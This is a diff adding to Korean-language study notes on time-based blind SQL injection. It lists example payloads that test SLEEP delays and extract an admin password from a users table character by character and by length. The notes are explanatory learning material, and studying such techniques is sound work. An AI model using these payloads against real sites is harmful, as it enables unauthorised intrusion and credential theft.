@@ -326,3 +326,22 @@ Blooean-based Blind SQLi는\
 - 응답이 **바로** 오면 -> 아님
 
 이 방식으로 한 글자씩 확인.
+
+**예시 흐름**
+1. 시간 지연이 되는지 확인
+  ```
+  ' AND SLEEP(5) -- -
+  ```
+  - 응답이 약 5초 늦어지면 -> Time-based 가능
+
+2. 데이터 추출
+  ```
+  ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) -- -
+  ```
+  - 응답이 늦으면 -> 첫 글자는 `a`
+  - 바로 오면 -> 다른 글자 시도
+
+3. 길이 확인
+   ```
+   ' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))=32, SLEEP(5), 0) -- -
+   ```
